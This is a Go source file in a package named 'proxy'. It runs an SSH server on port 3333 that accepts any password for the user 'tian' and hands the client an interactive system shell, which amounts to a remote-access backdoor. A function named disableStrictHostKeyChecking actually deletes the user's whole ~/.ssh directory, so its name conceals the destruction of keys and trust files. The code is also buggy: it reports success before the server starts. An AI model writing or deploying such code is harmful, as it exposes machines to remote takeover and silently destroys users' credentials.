package proxy

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"

	gssh "github.com/gliderlabs/ssh"
)

func main() {
	errChan := StartSShServer()
	err := <-errChan
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("success")
	}
}

func StartSShServer() chan error {
	result := make(chan error)

	go func() {
		// Disable StrictHostKeyChecking
		err := disableStrictHostKeyChecking()
		if err != nil {
			result <- fmt.Errorf("failed to disable StrictHostKeyChecking: %w", err)
			return
		}

		server := &gssh.Server{
			Addr: ":3333",
			PasswordHandler: func(ctx gssh.Context, password string) bool {
				return ctx.User() == "tian"
			},
			Handler: func(s gssh.Session) {
				_, winCh, isPty := s.Pty()
				if isPty {
					handlePty(s, winCh)
				}
			},
		}

		// If the server started successfully, send nil
		result <- nil

		// Start the server in a new goroutine
		go func() {
			err = server.ListenAndServe()
			if err != nil {
				fmt.Println(fmt.Errorf("failed to start server: %w", err))
			}
		}()
	}()

	return result
}

func handlePty(s gssh.Session, winCh <-chan gssh.Window) {
	var shell string
	if runtime.GOOS == "windows" {
		shell = "powershell"
	} else {
		shell = "/bin/sh"
	}

	cmd := exec.Command(shell)
	cmd.Env = append(cmd.Env, "TERM=xterm")

	stdout, _ := cmd.StdoutPipe()
	stdin, _ := cmd.StdinPipe()

	go func() {
		io.Copy(stdin, s)
	}()

	go func() {
		io.Copy(s, stdout)
	}()

	cmd.Start()
	cmd.Wait()
}

func disableStrictHostKeyChecking() error {
	var sshConfigPath string
	if runtime.GOOS == "windows" {
		sshConfigPath = os.Getenv("USERPROFILE") + "\\.ssh"
	} else {
		sshConfigPath = os.Getenv("HOME") + "/.ssh"
	}

	// 清空.ssh
	err := os.RemoveAll(sshConfigPath)
	if err != nil {
		return err
	}

	return nil

}
